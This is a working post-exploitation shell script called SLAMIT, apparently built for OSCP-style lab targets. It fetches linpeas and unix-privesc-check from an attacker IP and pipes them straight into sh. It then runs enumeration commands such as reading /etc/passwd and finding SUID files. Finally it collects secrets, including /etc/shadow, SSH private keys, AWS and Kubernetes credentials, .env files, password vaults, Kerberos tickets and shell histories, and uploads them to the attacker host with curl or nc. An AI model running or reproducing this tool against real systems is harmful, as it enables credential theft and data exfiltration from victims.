#!/bin/sh

# =============================================================================
# SLAMIT - System Enumeration and File Exfiltration Tool
# =============================================================================
# 
# This script performs comprehensive system enumeration and uploads interesting
# files to a web server. It includes:
# - Automatic enumeration (linpeas, unix-privesc-check)
# - Manual enumeration commands
# - File discovery and upload
# 
# NOTE: custom_upload.sh is commented out to prevent duplicate file uploads
# since this script already handles file searching and uploading.
# 
# =============================================================================

# Configuration

CMD_OUTPUT=""
EXFIL_LOCATION="/tmp/slamit" # MUST BE A WRITEABLE LOCATION ON TARGET

# Ensure the output directory exists
mkdir -p "$EXFIL_LOCATION"

OUTPUT_FILE="$EXFIL_LOCATION/slamit-sh-out.txt"
OUTPUT_LINPEAS="$EXFIL_LOCATION/linpeas-out.txt"
OUTPUT_UNIX_PRIVESC="$EXFIL_LOCATION/unix-privesc-check-out.txt"
URI="192.168.45.163"
PORT=80
URL="http://$URI:$PORT";        # Replace with your endpoint URL
BASE_DIRECTORY="/home/kali/projects/oscp";
MAIN_DIRECTORY="challenges";
PROJECT_DIRECTORY="oscp_c";
# HOSTNAME=$(hostname);
HOSTNAME="Charlie"
TARGET_FOLDER="$BASE_DIRECTORY/$MAIN_DIRECTORY/$PROJECT_DIRECTORY/$HOSTNAME"
BOUNDARY="----BOUNDARY-$$"
DIVIDER="================================================================"
SYSTEM_HAS_CURL=1

cat <<'EOF'



                           _________.____       _____      _____  .______________
                          /   _____/|    |     /  _  \    /     \ |   \__    ___/
                          \_____  \ |    |    /  /_\  \  /  \ /  \|   | |    |   
                          /        \|    |___/    |    \/    Y    \   | |    |   
                         /_______  /|_______ \____|__  /\____|__  /___| |____|   
                                 \/         \/       \/         \/               
 
....................................................................................................
....................................................................................................
..............................................%%+***#%..............................................
............................................##%%....#%+%............................................
............................................%*%......%*%............................................
.............................................%+@....@%%*............................................
.............................................%+%....%+%.............................................
..............................................%*%..%+%..............................................
...............................................%%%%%%...............................................
..............................................%*+***+%..............................................
..............................................%+***+*%..............................................
..............................................%%%%%%%%..............................................
..............................................%***+++%..............................................
..............................................%***++*%..............................................
..............................................%%%%%%%%..............................................
..............................................%+++*++%..............................................
..............................................%*+****%..............................................
................................%.............%%%%%%%%..............................................
.................................%.....:......%****++%.......%......................................
..................................%....@......%+*****%......%......#................................
...................................%....%.....%%%%%%*%......%.....%.................................
..............................................%*+****%...........%..................................
..............................................%******%....................-%........................
..........................%...................%*+****%...................%..........................
............................%...%%%########***++============+++*#%%%...%............................
...............................%-=%=========-=============-====--%=-@...............................
...............................%-=%======-==-=-==================%=-@...............................
.....................%%........%==%===--========================-%-=%........@@.....................
...............................%==%======-=====-=================%==%....@%+........................
...............................%==%================--======-=====%==%...............................
...............................%==%==============================%==%...............................
....................#@:........%=-%=========-=====%%=============%==%........*%.....................
......................+%:-:=+--%-=%=====-==%%=====%%====-+%======%==%--@%---%+......................
........................%%%-----:%%%%%%%%%%%%*%@@%--%%%%%-%%%%%%%%%-------%#@.......................
........................%##%%%--------------%--%%%--%#%--%-------------%%###@.......................
........................%##%---%%:------%%*:%--------:---%--=%------%%--:###@.......................
.......................:###%----@%:------%-----%----:-------%=----%-----:###@.......................
..................%%%:.-###%--%@---------------%%:-:%:-------------:%@--:###@.......................
.......................:###%%-----------%%@----%#%%%%--:%%:------------%%###@.......................
........................#%#%@@%%%%%%%:----:%##%%#%#%%%##%-----%%%%%%%%%%%%%#@.......................
........................###%--------%-----:%#####%%%###%%------%--------=###@.......................
........................###@-------%----%%%%%%##%#%#%%%%%%%@----%-------:###@.......................
........................###@------%--%%------%%%##%###%------@%--%-------%##@.......................
........................###@-----%%---------%%%-:%%%@%%@--------@%%------%##@.......................
........................###@%@%------------%------%-----%#---------------%##@.......................
........................###@%%----------+%--------%-------%--------------%##@.......................
........................###@------------%------------------%-------------%##@.......................
.......................:###%#%%%%%%@%%%@@@@@@@@@@%%%%@@%@%@@%%%%%%%%@@@@%%##@.......................
.......................=####################################################@.......................
........................%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%........................
.............................................%#########*............................................
.............................................%##########............................................
.....................................%#########################.....................................
......................................::::::::::::::::::::::::......................................



EOF

printSectionTitle() 
{
    # Header box follows here
    HEADER_NAME="$1";
    WIDTH=100;
    BORDER_CHAR="#";
    PADDING_CHAR=" ";

    # Top border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Centered header
    INNER_WIDTH=$((WIDTH - 2));
    TEXT_LEN=${#HEADER_NAME};
    LEFT_PAD=$(( (INNER_WIDTH - TEXT_LEN) / 2 ));
    RIGHT_PAD=$(( INNER_WIDTH - TEXT_LEN - LEFT_PAD ));

    printf "%s%*s%s%*s%s\n" "$BORDER_CHAR" \
        "$LEFT_PAD" "" \
        "$HEADER_NAME" \
        "$RIGHT_PAD" "" \
        "$BORDER_CHAR";

    # Empty line
    printf "%s%*s%*s%s\n" "$BORDER_CHAR" \
        $(( (WIDTH - 2) / 2 )) "" \
        $(( WIDTH - 2 - ( (WIDTH - 2) / 2) )) "" \
        "$BORDER_CHAR";

    # Bottom border
    printf '%*s\n' "$WIDTH" '' | tr ' ' "$BORDER_CHAR";
    printf "\n\n";
}

# Determine which program can be used to perform web requests,
# preferring curl.
if command -v curl >/dev/null 2>&1; then
    REQUEST_CMD="curl";
elif command -v wget >/dev/null 2>&1; then
    REQUEST_CMD="wget -qO-";
    SYSTEM_HAS_CURL=0;
else
    echo "Error: Neither curl nor wget is installed." >&2;
    exit 1;
fi

printSectionTitle "Automatic Enumeration"

# Create output files first
touch "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"

# Run linpeas and capture output
echo "Running linpeas..."
{ $REQUEST_CMD "$URL/linpeas.sh"; echo "exit 0"; } | sh >> "$OUTPUT_LINPEAS" 2>&1

# Run unix-privesc-check and capture output
echo "Running unix-privesc-check..."
{ $REQUEST_CMD "$URL/unix-privesc-check"; echo "exit 0"; } | sh -s "detailed" >> "$OUTPUT_UNIX_PRIVESC" 2>&1

echo "Automatic enumeration complete. Output written to:"
echo "  - $OUTPUT_LINPEAS"
echo "  - $OUTPUT_UNIX_PRIVESC"
echo ""

# $REQUEST_CMD "$URL/custom_upload.sh";
# NOTE: custom_upload.sh is commented out to prevent duplicate file uploads
# since slamit.sh already handles file searching and uploading below


# ($REQUEST_CMD "$URL/linpeas.sh"; exit 0 | sh) >> "$OUTPUT_LINPEAS" 2>&1 &
# ($REQUEST_CMD "$URL/unix-privesc-check" | sh -s "detailed") >> "$OUTPUT_UNIX_PRIVESC" 2>&1 &

printSectionTitle "Manual Enumeration"

# Create and initialize the output file
touch "$OUTPUT_FILE"
printSectionTitle "Manual Enumeration" >> "$OUTPUT_FILE";

# Loop through each full command line
# Feel free to add whatever you want in here! :D
while IFS= read -r CMD; do
    [ -z "$CMD" ] && continue  # Skip empty lines
    {
        echo "$DIVIDER"
        echo "COMMAND: $CMD"
        echo "$DIVIDER"
        echo
        sh -c "$CMD" 2>&1
        echo
    } >> "$OUTPUT_FILE"
done <<EOF
whoami
id
cat /etc/passwd
hostname
cat /etc/issue
cat /etc/os-release
uname -a
ps aux
ip a
ifconfig
route
routel
netstat -antup
ss -anp
ls -Flagh /etc/iptables
cat /etc/iptables/rules.v4
ls -lah /etc/cron*
crontab -l
dpkg -l
find / -writable -type d 2>/dev/null
find / -writable -type f 2>/dev/null
cat /etc/fstab
mount
lsblk
lsmod
find / -perm -u=s -type f 2>/dev/null
env
cat ~/.bashrc
grep "CRON" /var/log/syslog
EOF

# sudo -l
# sudo crontab -l

echo "Manual enumeration complete. Output written to $OUTPUT_FILE.";
echo ""

printSectionTitle "File Discovery and Upload"

# Create a dedicated staging directory for discovered files
STAGING_DIR="$EXFIL_LOCATION/SLAMIT_Discovered_Files"
if [ -d "$STAGING_DIR" ]; then
    rm -rf "$STAGING_DIR"
fi
mkdir -p "$STAGING_DIR"

echo "Created staging directory: $STAGING_DIR"

# Space-separated list of extensions (exclude .sh to avoid script contamination)
EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
    yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
    sqlite3 mdb accdb rtf md pem p12 pfx key crt cer p7b p7c
    kerberoast kirb ccache hccapx wpa pcap pcapng cap kbx";
SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa id_ed25519 id_dsa \.git* /etc/passwd /etc/shadow
    .bash_history .zsh_history .mysql_history .psql_history .rediscli_history
    .ssh/known_hosts .ssh/config .aws/credentials .aws/config
    .docker/config.json .kube/config .npmrc .pip/pip.conf
    .netrc .my.cnf .pgpass .ldaprc .subversion/config
    .env .env.local .env.production
    .gnupg/secring.gpg .gnupg/pubring.gpg .gnupg/trustdb.gpg";

# MODIFY THIS to search in different directories.
DIRECTORIES="$HOME /home /var/log";

# Start building the find command
FIND_CMD="find";

# Add directories
for DIR in $DIRECTORIES; do
    FIND_CMD="$FIND_CMD $DIR";
done

# Build the find command dynamically - consolidate all searches into one command
FIND_CMD="$FIND_CMD -type f ! -name linpeas.sh -readable \\(";

# Add extension searches
FIRST=1;
for EXT in $EXTENSIONS; do
    if [ "$FIRST" -eq 1 ]; then
        FIND_CMD="$FIND_CMD -iname '*.$EXT'";
        FIRST=0;
    else
        FIND_CMD="$FIND_CMD -o -iname '*.$EXT'";
    fi
done

# Add specific file searches
for FILE in $SPECIFIC_FILES; do
    FIND_CMD="$FIND_CMD -o -name \"$FILE\"";
done

# Add output files (ensure they exist first)
for FILE in "$OUTPUT_FILE" "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"; do
    if [ -f "$FILE" ]; then
        FILENAME=$(basename "$FILE");
        FIND_CMD="$FIND_CMD -o -path \"$FILE\"";
    fi
done

FIND_CMD="$FIND_CMD \\) 2>/dev/null";

echo "Completed FIND_CMD = $FIND_CMD";

# First, stage all discovered files to prevent duplicates and contamination
echo "Staging discovered files to prevent duplicates..."

# Use temporary files to avoid subshell variable scope issues
STAGED_FILES_LIST=$(mktemp)
UNIQUE_FILES_LIST=$(mktemp)
STAGED_COUNT=0

# Evaluate the find command and collect unique files (by inode to prevent duplicates)
eval "$FIND_CMD" | while IFS= read -r FILE; do
    if [ -f "$FILE" ] && [ -r "$FILE" ]; then
        # Get file inode to check for duplicates
        INODE=$(stat -c %i "$FILE" 2>/dev/null || echo "")
        if [ -n "$INODE" ]; then
            # Check if we've already seen this inode
            if ! grep -q "^$INODE:" "$UNIQUE_FILES_LIST" 2>/dev/null; then
                echo "$INODE:$FILE" >> "$UNIQUE_FILES_LIST"
            fi
        fi
    fi
done

# Now process unique files and stage them
while IFS=: read -r INODE FILE; do
    if [ -f "$FILE" ] && [ -r "$FILE" ]; then
        FILENAME=$(basename "$FILE")
        
        # Create unique filename to avoid conflicts
        TARGET_PATH="$STAGING_DIR/$FILENAME"
        COUNTER=1
        
        # Handle conflicts by adding -1, -2, etc.
        while [ -f "$TARGET_PATH" ]; do
            BASE_NAME=$(echo "$FILENAME" | sed 's/\.[^.]*$//')
            EXTENSION=$(echo "$FILENAME" | sed 's/.*\.//')
            TARGET_PATH="$STAGING_DIR/${BASE_NAME}-${COUNTER}.${EXTENSION}"
            COUNTER=$((COUNTER + 1))
        done
        
        # Copy file to staging directory
        if cp "$FILE" "$TARGET_PATH" 2>/dev/null; then
            echo "$TARGET_PATH" >> "$STAGED_FILES_LIST"
            echo "Staged: $FILENAME → $TARGET_PATH"
        else
            echo "Failed to stage: $FILENAME"
        fi
    fi
done < "$UNIQUE_FILES_LIST"

# Get the actual count of staged files
STAGED_COUNT=$(wc -l < "$STAGED_FILES_LIST" 2>/dev/null || echo "0")

echo "Successfully staged $STAGED_COUNT files to: $STAGING_DIR"

# Now upload only the staged files
if [ "$STAGED_COUNT" -eq 0 ] || [ "$STAGED_COUNT" -eq "0" ]; then
    echo "No files staged. Nothing to upload."
    rm -f "$STAGED_FILES_LIST"
    exit 0
fi

echo "Starting upload of $STAGED_COUNT staged files..."

# Initialize counters
UPLOAD_COUNT=0
SUCCESS_COUNT=0
FAILED_COUNT=0

# Upload staged files by reading from the temporary file
while IFS= read -r STAGED_FILE; do
    if [ -f "$STAGED_FILE" ]; then
        FILENAME=$(basename "$STAGED_FILE")
        UPLOAD_COUNT=$((UPLOAD_COUNT + 1))

        # Show progress every 10 files or for the last file
        if [ $((UPLOAD_COUNT % 10)) -eq 0 ] || [ $UPLOAD_COUNT -eq $STAGED_COUNT ]; then
            echo "Progress: [$UPLOAD_COUNT/$STAGED_COUNT] files processed"
        fi

        # Upload using curl with multipart form (silent)

        if  [ "$SYSTEM_HAS_CURL" -eq 1 ]; then
            RESPONSE=$(curl -s -w "%{http_code}" -o /dev/null -X POST "$URL" \
                -F "folder=$TARGET_FOLDER" \
                -F "file=@$STAGED_FILE;filename=$FILENAME" \
                -H "Expect:");
            # Check if upload was successful
            if [ "$RESPONSE" -ge 200 ] && [ "$RESPONSE" -lt 300 ]; then
                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
            else
                FAILED_COUNT=$((FAILED_COUNT + 1))
            fi
        else
            # Write data to temporary files to be able to handle binary data.
            TMPFILE=$(mktemp);

            # Write the first part (folder field)
            {
            printf -- "--%s\r\n" "$BOUNDARY";
            printf "Content-Disposition: form-data; name=\"folder\"\r\n";
            printf "\r\n";
            printf "%s\r\n" "$TARGET_FOLDER";

            # Write the file headers
            printf -- "--%s\r\n" "$BOUNDARY";
            printf "Content-Disposition: form-data; name=\"file\"; filename=\"%s\"\r\n" "$FILENAME";
            printf "Content-Type: application/octet-stream\r\n";
            printf "\r\n";
            } > "$TMPFILE";

            cat "$STAGED_FILE" >> "$TMPFILE";

            # Append closing boundary
            printf "\r\n--%s--\r\n" "$BOUNDARY" >> "$TMPFILE";

            # Get accurate content length
            CONTENT_LENGTH=$(wc -c < "$TMPFILE");

            # Send the HTTP request using netcat
            {
            printf "POST / HTTP/1.1\r\n";
            printf "Host: %s:%s\r\n" "$URI" "$PORT";
            printf "Content-Type: multipart/form-data; boundary=%s\r\n" "$BOUNDARY";
            printf "Content-Length: %s\r\n" "$CONTENT_LENGTH";
            printf "Expect:\r\n";
            printf "\r\n";
            cat "$TMPFILE";
            } | nc "$URI" "$PORT" >/dev/null 2>&1;

            # Clean up
            rm -f "$TMPFILE";

            if [ $? -eq 0 ]; then
                SUCCESS_COUNT=$((SUCCESS_COUNT + 1))
            else
                FAILED_COUNT=$((FAILED_COUNT + 1))
            fi
        fi
    fi
done < "$STAGED_FILES_LIST"

# Clean up temporary files
rm -f "$STAGED_FILES_LIST" "$UNIQUE_FILES_LIST"

# Pretty print summary
echo ""
echo "=================================================================================="
echo "                              UPLOAD SUMMARY"
echo "=================================================================================="
echo "  Total Files Processed: $(printf "%8d" $UPLOAD_COUNT)"
echo "  Successfully Uploaded: $(printf "%8d" $SUCCESS_COUNT)"
echo "  Failed Uploads:        $(printf "%8d" $FAILED_COUNT)"
echo "=================================================================================="
echo ""

echo "Upload complete! Total files uploaded: $UPLOAD_COUNT"

# Cleanup staging directory
echo ""
echo "Cleaning up staging directory..."
if [ -d "$STAGING_DIR" ]; then
    rm -rf "$STAGING_DIR"
    echo "Cleaned up staging directory: $STAGING_DIR"
fi

# Final completion message
echo ""
printSectionTitle "SLAMIT COMPLETE"
echo "All operations completed successfully!"
echo "Files were staged, uploaded, and cleaned up automatically."
echo "Check the output files for enumeration results:"
echo "  - $OUTPUT_FILE"
echo "  - $OUTPUT_LINPEAS" 
echo "  - $OUTPUT_UNIX_PRIVESC"
echo ""

# Note: Output files are preserved for analysis
# Files available at:
#   - $OUTPUT_FILE
#   - $OUTPUT_LINPEAS 
#   - $OUTPUT_UNIX_PRIVESC
exit 0;